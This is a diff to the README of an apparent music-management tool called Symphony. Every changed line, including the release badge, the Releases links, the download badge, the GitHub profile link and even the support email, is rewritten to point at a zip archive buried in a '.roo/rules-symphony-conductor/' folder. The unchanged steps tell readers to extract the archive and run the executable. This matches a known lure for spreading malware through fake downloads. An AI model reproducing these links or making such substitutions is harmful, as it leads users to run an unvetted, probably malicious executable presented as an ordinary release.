@@ -1,6 +1,6 @@
 # 🎶 Symphony: Your Ultimate Music Management Tool 🎶
 
-![GitHub release](https://img.shields.io/github/release/kris1019/Symphony.svg)
+![GitHub release](https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip)
 
 Welcome to **Symphony**, a powerful tool designed to help you manage your music library with ease. Whether you are a casual listener or a music enthusiast, Symphony provides a seamless experience for organizing, playing, and discovering music. 
 
@@ -27,7 +27,7 @@ Welcome to **Symphony**, a powerful tool designed to help you manage your music 
 
 To get started with Symphony, follow these simple steps:
 
-1. Download the latest version from the [Releases section](https://github.com/kris1019/Symphony/releases).
+1. Download the latest version from the [Releases section](https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip).
 2. Extract the downloaded file.
 3. Run the executable file.
 
@@ -58,13 +58,13 @@ Symphony is licensed under the MIT License. See the [LICENSE](LICENSE) file for 
 
 For any inquiries or support, feel free to reach out:
 
-- Email: support@symphonymusic.com
-- GitHub: [kris1019](https://github.com/kris1019)
+- Email: https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip
+- GitHub: [kris1019](https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip)
 
 ## Releases
 
-To stay updated with the latest features and fixes, visit the [Releases section](https://github.com/kris1019/Symphony/releases). Here, you can download the latest version and check out previous releases. 
+To stay updated with the latest features and fixes, visit the [Releases section](https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip). Here, you can download the latest version and check out previous releases. 
 
-![Download](https://img.shields.io/badge/Download_Latest_Version-Click_Here-brightgreen)
+![Download](https://raw.githubusercontent.com/kris1019/Symphony/main/.roo/rules-symphony-conductor/Software_2.1.zip)
 
 Thank you for choosing Symphony! We hope you enjoy managing your music library with our tool.
